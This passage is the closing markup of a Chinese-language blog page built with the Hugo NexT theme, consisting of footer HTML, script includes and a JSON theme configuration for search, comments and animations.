</a><span>提供CDN/云资源支持</span></div></div></footer><script type=text/javascript src=https://zp9080.github.io/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"https://zp9080.github.io/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"fadeInLeft","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"https://zp9080.github.io/3rd"}},"version":"4.6.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src=/js/main.min.befa9b7d22ec90da86c74c5dbff5ee42c12e9fc6d6f4448bfcc596cc329b19e8.js defer></script></body></html>